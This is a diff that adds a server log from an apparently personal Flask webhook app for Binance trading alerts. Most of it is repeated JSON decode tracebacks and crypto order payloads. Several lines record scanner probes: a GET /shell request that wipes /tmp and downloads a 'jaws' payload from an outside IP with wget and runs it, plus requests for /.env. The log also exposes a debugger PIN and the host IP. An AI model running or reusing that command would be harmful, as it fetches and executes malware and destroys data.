+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:17] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.006908
+(22236) accepted ('34.212.75.30', 38878)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:17] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.006185
+(22236) accepted ('34.212.75.30', 38882)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:17] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004272
+(22236) accepted ('34.212.75.30', 38924)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:18] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004264
+(22236) accepted ('52.32.178.7', 55280)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:18] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004111
+(22236) accepted ('34.212.75.30', 38932)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:18] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004592
+(22236) accepted ('34.212.75.30', 39082)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:19] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004068
+(22236) accepted ('52.32.178.7', 55438)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:14:19] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.003701
+(22236) accepted ('34.212.75.30', 39094)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:14:19] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.003691
+ * Detected change in '/home/ec2-user/binance-api/flask_app/trview/api.py', reloading
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:09-----------------------------'
+b'D-RSI Short BINANCE:LTCUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:09-----------------------------'
+b'D-RSI Exit Short BINANCE:LTCUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:11-----------------------------'
+b'D-RSI Exit Long BINANCE:ETHUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:11-----------------------------'
+b'D-RSI Short BINANCE:ETHUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:11-----------------------------'
+b'D-RSI Exit Short BINANCE:ETHUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:12-----------------------------'
+b'D-RSI Exit Long BINANCE:SOLUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:12-----------------------------'
+b'D-RSI Exit Short BINANCE:SOLUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:12-----------------------------'
+b'D-RSI Short BINANCE:SOLUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:12-----------------------------'
+b'D-RSI Short BINANCE:MATICUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:12-----------------------------'
+b'D-RSI Exit Short BINANCE:MATICUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:12-----------------------------'
+b'D-RSI Exit Long BINANCE:MATICUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:14-----------------------------'
+b'D-RSI Exit Long BINANCE:LTCUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:14-----------------------------'
+b'D-RSI Short BINANCE:LTCUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:14-----------------------------'
+b'D-RSI Exit Short BINANCE:LTCUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:16-----------------------------'
+b'D-RSI Exit Long BINANCE:ETHUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:16-----------------------------'
+b'D-RSI Short BINANCE:ETHUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:16-----------------------------'
+b'D-RSI Exit Short BINANCE:ETHUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:17-----------------------------'
+b'D-RSI Exit Long BINANCE:SOLUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:17-----------------------------'
+b'D-RSI Exit Short BINANCE:SOLUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:17-----------------------------'
+b'D-RSI Short BINANCE:SOLUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:18-----------------------------'
+b'D-RSI Short BINANCE:MATICUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:18-----------------------------'
+b'D-RSI Exit Short BINANCE:MATICUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:18-----------------------------'
+b'D-RSI Exit Long BINANCE:MATICUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:19-----------------------------'
+b'D-RSI Exit Long BINANCE:LTCUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:19-----------------------------'
+b'D-RSI Short BINANCE:LTCUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:14:19-----------------------------'
+b'D-RSI Exit Short BINANCE:LTCUSDT'
+<class 'bytes'>
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 389-553-210
+(22248) wsgi starting up on http://0.0.0.0:80
+ * Detected change in '/home/ec2-user/binance-api/flask_app/trview/api.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 389-553-210
+(22252) wsgi starting up on http://0.0.0.0:80
+(22252) accepted ('52.32.178.7', 22602)
+52.32.178.7 - - [12/Jul/2023 16:21:00] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.004349
+(22252) accepted ('52.32.178.7', 36962)
+52.32.178.7 - - [12/Jul/2023 16:23:02] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.001246
+ * Detected change in '/home/ec2-user/binance-api/flask_app/trview/api.py', reloading
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:21:00-----------------------------'
+EnvironHeaders([('Content-Type', 'application/json; charset=utf-8'), ('Content-Length', '327'), ('Host', '54.238.85.242:80'), ('User-Agent', 'Go-http-client/1.1'), ('Accept-Encoding', 'gzip'), ('Connection', 'close')])
+(b'    {\n    "strategy_name" : "drsi_with_filters",\n    "alert_message":"",'
+ b'\n    "action": "buy",\n    "contracts": "1.173", \n    "market_position": '
+ b'"long",\n    "market_position_size": "0.581",\n    "order_id": "long",\n   '
+ b' "price": "22.72",\n    "ticker": "SOLUSDT",\n    "firetime" : "2023-07-12'
+ b'T13:21:00Z",\n    "interval" : "1"\n    }')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:23:02-----------------------------'
+EnvironHeaders([('Content-Type', 'application/json; charset=utf-8'), ('Content-Length', '333'), ('Host', '54.238.85.242:80'), ('User-Agent', 'Go-http-client/1.1'), ('Accept-Encoding', 'gzip'), ('Connection', 'close')])
+(b'    {\n    "strategy_name" : "drsi_with_filters",\n    "exchange" : "BINAN'
+ b'CE",\n    "action": "sell",\n    "contracts": "1.161", \n    "market_positi'
+ b'on": "short",\n    "market_position_size": "0.58",\n    "order_id": "short'
+ b'",\n    "price": "22.61",\n    "ticker": "SOLUSDT",\n    "firetime" : "2023'
+ b'-07-12T13:23:01Z",\n    "interval" : "1"\n    }')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 389-553-210
+(22288) wsgi starting up on http://0.0.0.0:80
+(22288) accepted ('42.243.167.8', 43118)
+42.243.167.8 - - [12/Jul/2023 16:30:57] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" 404 369 0.001316
+(22288) accepted ('42.243.167.8', 43130)
+(22288) accepted ('34.212.75.30', 27208)
+34.212.75.30 - - [12/Jul/2023 16:32:03] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.002819
+(22288) accepted ('101.32.209.199', 54842)
+101.32.209.199 - - [12/Jul/2023 16:32:46] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 138 0.000757
+(22288) accepted ('52.32.178.7', 51716)
+52.32.178.7 - - [12/Jul/2023 16:33:01] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.001519
+(22288) accepted ('52.32.178.7', 53794)
+52.32.178.7 - - [12/Jul/2023 16:33:05] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.001092
+(22288) accepted ('52.32.178.7', 25628)
+52.32.178.7 - - [12/Jul/2023 16:35:00] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.001914
+(22288) accepted ('52.32.178.7', 40528)
+52.32.178.7 - - [12/Jul/2023 16:36:02] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.006537
+(22288) accepted ('52.32.178.7', 41100)
+52.32.178.7 - - [12/Jul/2023 16:36:03] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.001376
+(22288) accepted ('34.212.75.30', 15914)
+34.212.75.30 - - [12/Jul/2023 16:39:01] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.001468
+(22288) accepted ('34.212.75.30', 27944)
+34.212.75.30 - - [12/Jul/2023 16:40:01] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.001610
+(22288) accepted ('185.254.196.186', 35402)
+185.254.196.186 - - [12/Jul/2023 16:42:36] "GET /.env HTTP/1.1" 404 369 0.000762
+(22288) accepted ('185.254.196.186', 37904)
+185.254.196.186 - - [12/Jul/2023 16:42:36] "POST / HTTP/1.1" 404 369 0.022594
+(22288) accepted ('34.212.75.30', 31758)
+34.212.75.30 - - [12/Jul/2023 16:53:02] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.001047
+(22288) accepted ('34.212.75.30', 30098)
+34.212.75.30 - - [12/Jul/2023 16:58:00] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.001223
+(22288) accepted ('52.32.178.7', 48694)
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:32:03-----------------------------'
+EnvironHeaders([('Content-Type', 'application/json; charset=utf-8'), ('Content-Length', '332'), ('Host', '54.238.85.242:80'), ('User-Agent', 'Go-http-client/1.1'), ('Accept-Encoding', 'gzip'), ('Connection', 'close')])
+{'action': 'buy',
+ 'contracts': '3.146',
+ 'exchange': 'BINANCE',
+ 'firetime': '2023-07-12T13:32:02Z',
+ 'interval': '1',
+ 'market_position': 'long',
+ 'market_position_size': '1.583',
+ 'order_id': 'long',
+ 'price': '66.18',
+ 'strategy_name': 'drsi_with_filters',
+ 'ticker': 'COMPUSDT'}
+<class 'dict'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:33:01-----------------------------'
+EnvironHeaders([('Content-Type', 'application/json; charset=utf-8'), ('Content-Length', '348'), ('Host', '54.238.85.242:80'), ('User-Agent', 'Go-http-client/1.1'), ('Accept-Encoding', 'gzip'), ('Connection', 'close')])
+{'action': 'buy',
+ 'contracts': '37.014',
+ 'exchange': 'BINANCE',
+ 'firetime': '2023-07-12T13:33:00Z',
+ 'interval': '1',
+ 'market_position': 'long',
+ 'market_position_size': '18.513',
+ 'order_id': 'long',
+ 'price': '0.7404000000000001',
+ 'strategy_name': 'drsi_with_filters',
+ 'ticker': 'MATICUSDT'}
+<class 'dict'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 16:33:05-----------------------------'
+EnvironHeaders([('Content-Type', 'application/json; charset=utf-8'), ('Content-Length', '338'), ('Host', '54.238.85.242:80'), ('User-Agent', 'Go-http-client/1.1'), ('Accept-Encoding', 'gzip'), ('Connection', 'close')])
+{'action': 'buy',
+ 'contracts': '1318.111',
+ 'exchange': 'BINANCE',
+ 'firetime': '2023-07-12T13:33:04Z',
+ 'interval': '1',
+ 'market_position': 'long',
+ 'market_position_size': '661.328',
+ 'order_id': 'long',
+ 'price': '0.01897',
+ 'strategy_name': 'drsi_with_filters',
+ 'ticker': 'VETUSDT'}
+<class 'dict'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
